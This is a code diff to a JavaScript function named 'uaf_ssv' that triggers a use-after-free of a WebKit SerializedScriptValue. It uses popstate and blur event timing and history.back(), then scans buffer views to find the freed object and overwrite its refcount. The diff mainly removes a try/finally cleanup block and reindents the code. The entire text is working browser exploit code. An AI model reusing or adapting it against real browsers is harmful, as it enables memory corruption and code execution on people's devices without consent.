@@ -202,10 +202,8 @@ async function uaf_ssv(fsets, index, save_pop = false) {
 
     let pop = null;
     let num_blurs = 0;
-    let completed = false;
-    let onpopstate = null;
     const pop_promise = new Promise((resolve, reject) => {
-        onpopstate = function (event) {
+        function onpopstate(event) {
             // debug_log('pop came');
             if (num_blurs === 0) {
                 const r = reject;
@@ -213,7 +211,7 @@ async function uaf_ssv(fsets, index, save_pop = false) {
             }
             pop = event;
             resolve();
-        };
+        }
         addEventListener('popstate', onpopstate, { once: true });
     });
 
@@ -244,11 +242,10 @@ async function uaf_ssv(fsets, index, save_pop = false) {
 
         num_blurs++;
     }
-    try {
-        input.addEventListener('blur', onblur);
+    input.addEventListener('blur', onblur);
 
-        document.body.append(input);
-        document.body.append(foo);
+    document.body.append(input);
+    document.body.append(foo);
 
     // FrameLoader::loadInSameDocument() calls Document::statePopped().
     // statePopped() will defer firing of popstate until we're in the complete
@@ -258,64 +255,54 @@ async function uaf_ssv(fsets, index, save_pop = false) {
     // item if we call loadInSameDocument too early
     // debug_log(`readyState now: ${document.readyState}`);
 
-        if (document.readyState !== 'complete') {
-            await new Promise(resolve => {
-                document.addEventListener('readystatechange', function foo() {
-                    if (document.readyState === 'complete') {
-                        document.removeEventListener('readystatechange', foo);
-                        resolve();
-                    }
-                });
+    if (document.readyState !== 'complete') {
+        await new Promise(resolve => {
+            document.addEventListener('readystatechange', function foo() {
+                if (document.readyState === 'complete') {
+                    document.removeEventListener('readystatechange', foo);
+                    resolve();
+                }
             });
-        }
+        });
+    }
 
     // debug_log(`readyState now: ${document.readyState}`);
 
-        await new Promise(resolve => {
-            input.addEventListener('focus', resolve, { once: true });
-            input.focus();
-        });
+    await new Promise(resolve => {
+        input.addEventListener('focus', resolve, { once: true });
+        input.focus();
+    });
 
-        history.back();
-        await pop_promise;
-        input.removeEventListener('blur', onblur);
+    history.back();
+    await pop_promise;
+    input.removeEventListener('blur', onblur);
 
     // debug_log('done await popstate');
 
-        for (const [i, view] of views.entries()) {
-            if (view[0] !== 0x41) {
+    for (const [i, view] of views.entries()) {
+        if (view[0] !== 0x41) {
             // debug_log(`view index: ${hex(i)}`);
             // debug_log('found view:');
             // debug_log(view);
 
-                input.remove();
-                foo.remove();
+            input.remove();
+            foo.remove();
 
             // set SSV's refcount to 1, all other fields to 0/NULL
             view[0] = 1;
             view.fill(0, 1);
 
-                completed = true;
-                if (save_pop) {
-                    return [new BufferView(view.buffer), pop];
-                }
+            if (save_pop) {
+                return [new BufferView(view.buffer), pop];
+            }
 
             // return without keeping any references to pop, making it GC-able.
             // its WebCore::PopStateEvent will then be freed on its death
-                return new BufferView(view.buffer);
-            }
-        }
-
-        die('failed SerializedScriptValue UaF');
-    } finally {
-        if (!completed) {
-            if (onpopstate) removeEventListener('popstate', onpopstate);
-            input.removeEventListener('blur', onblur);
-            input.remove();
-            foo.remove();
-            views.length = 0;
+            return new BufferView(view.buffer);
         }
     }
+
+    die('failed SerializedScriptValue UaF');
 }
 
 class Reader {
